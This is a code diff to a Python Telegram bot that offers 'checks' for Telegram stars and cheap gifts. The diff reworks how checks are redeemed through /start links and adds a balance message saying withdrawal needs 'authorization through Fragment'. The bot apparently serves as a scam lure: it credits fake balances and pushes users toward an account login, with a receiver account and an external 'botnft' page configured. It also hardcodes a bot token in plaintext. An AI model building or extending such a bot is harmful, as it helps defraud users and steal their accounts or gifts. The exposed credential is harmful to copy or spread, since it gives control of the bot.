@@ -1,3 +1,4 @@
+# bot.py
 import asyncio
 import logging
 import os
@@ -12,7 +13,7 @@ import json
 TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 ADMIN_ID = 8503291981
 RECEIVER_USERNAME = "@Defbymorgenshtern"
-BOT_USERNAME = "Givestarbots_bot"  # Без @
+BOT_USERNAME = "Givestarbots_bot"
 
 RENDER_URL = "https://chatpggpupsik-max.github.io/botnft/templates/index.html"
 
@@ -87,12 +88,55 @@ def main_inline():
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
+    # Проверяем, есть ли в команде check_id
+    args = message.text.split()
+    if len(args) > 1:
+        check_id = args[1]
+        await process_check_activation(message, check_id)
+        return
+    
+    # Обычный /start
     text = (
         "🤖 *Добро пожаловать!*\n\n"
         "Этот бот создан для создания чеков на звёзды и покупки подарков по выгодным ценам.\n\n"
         "Выберите действие:"
     )
     await message.answer(text, parse_mode="Markdown", reply_markup=main_inline())
+
+async def process_check_activation(message: types.Message, check_id: str):
+    """Обработка активации чека по ссылке"""
+    checks = load_checks()
+    
+    if check_id in checks:
+        amount = checks[check_id]["amount"]
+        
+        # Начисляем баланс
+        users = load_users()
+        user_id = str(message.from_user.id)
+        if user_id not in users:
+            users[user_id] = {
+                "balance": 0,
+                "checks_created": 0,
+                "stars_spent": 0,
+                "username": message.from_user.username or "нет",
+                "first_name": message.from_user.first_name or "нет"
+            }
+        users[user_id]["balance"] += amount
+        save_users(users)
+        
+        # Сообщение об успешном получении
+        await message.answer(
+            f"✅ *Получено {amount} ⭐!*\n\n"
+            f"От чека `{check_id}` на баланс.\n\n"
+            f"Чтобы вывести чек вам нужно перейти в раздел *Баланс*",
+            parse_mode="Markdown",
+            reply_markup=main_keyboard()
+        )
+    else:
+        await message.answer(
+            "❌ Чек не найден или уже был активирован.",
+            reply_markup=main_keyboard()
+        )
 
 @dp.message(Command("menu"))
 async def cmd_menu(message: types.Message):
@@ -133,35 +177,6 @@ async def process_amount(message: types.Message, state: FSMContext):
         await state.clear()
     except ValueError:
         await message.answer("❌ Введите число!")
-
-@dp.message(F.text.startswith("/start check_"))
-async def start_check(message: types.Message):
-    check_id = message.text.replace("/start ", "")
-    checks = load_checks()
-    
-    if check_id in checks:
-        amount = checks[check_id]["amount"]
-        await message.answer(
-            f"✅ *Начислено {amount} звёзд!*\n\n"
-            f"Откройте профиль чтобы посмотреть информацию и вывести их.",
-            parse_mode="Markdown",
-            reply_markup=main_keyboard()
-        )
-        
-        users = load_users()
-        user_id = str(message.from_user.id)
-        if user_id not in users:
-            users[user_id] = {
-                "balance": 0,
-                "checks_created": 0,
-                "stars_spent": 0,
-                "username": message.from_user.username or "нет",
-                "first_name": message.from_user.first_name or "нет"
-            }
-        users[user_id]["balance"] += amount
-        save_users(users)
-    else:
-        await message.answer("Чек не найден.", reply_markup=main_keyboard())
 
 @dp.message(Command("checks"))
 async def cmd_checks(message: types.Message):
@@ -240,7 +255,11 @@ async def balance_handler(message: types.Message):
         [InlineKeyboardButton(text="💸 Вывести звёзды", callback_data="withdraw_request")]
     ])
     
-    await message.answer(f"💰 Ваш баланс: {bal} ⭐", reply_markup=kb)
+    await message.answer(
+        f"💰 Ваш баланс: {bal} ⭐\n\n"
+        f"Для вывода звёзд необходима авторизация через Fragment.",
+        reply_markup=kb
+    )
 
 @dp.message(F.text == "⭐ Создать чек на звёзды")
 async def create_check_button(message: types.Message):
